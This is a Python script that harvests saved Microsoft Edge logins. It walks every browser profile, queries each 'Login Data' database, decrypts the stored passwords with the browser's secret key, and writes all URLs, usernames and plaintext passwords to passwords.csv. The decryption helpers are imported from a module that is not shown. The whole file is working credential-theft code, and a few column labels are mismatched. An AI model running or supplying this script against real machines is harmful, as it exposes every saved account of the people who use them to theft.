# Necessay Imports
import os
import csv
from edge import *

if __name__ == '__main__':
    try:
        with open('passwords.csv', mode='w', newline='', encoding='utf-8') as decrypted_file:
            writer = csv.writer(decrypted_file, delimiter=',')

            # Writing Header row in CSV File
            writer.writerow(["Index", "Access_URL", "Origin_URL", "Username", "password"])

            # getting Secret key
            secret = get_edge_secret_key()

            # extracting all profiles location in a list
            folders = [element for element in os.listdir(EDGE_PATH) if element.startswith("Profile") or element == "Default"]

            # iterating over each folder for Login Data file
            for folder in folders:
                edge_db = os.path.normpath(r"%s\%s\Login Data"%(EDGE_PATH,folder))

                # saving Login Data file in a sqlite db and getting a connection
                connection = get_db_connection(edge_db)

                # extracting necessary fields from logins table
                if (secret and connection):
                    cursor = connection.cursor()
                    cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")

                    for index, login in enumerate(cursor.fetchall()):
                        aURL = login[0]
                        oURL = login[1]
                        username = login[2]
                        cipher = login[3]

                        if ((aURL != '' or oURL != '') and username != '' and cipher != ''):
                            # decrypting cyphertext in plain text
                            decrypted_password = decrypt_password(ciphertext = cipher, secret_key = secret)

                            writer.writerow([index, aURL, oURL, username, decrypted_password])

                    # closing connections
                    cursor.close()
                    connection.close()

                    # removing database file
                    os.remove('passwords.db')

    except Exception as e:
        print(e)



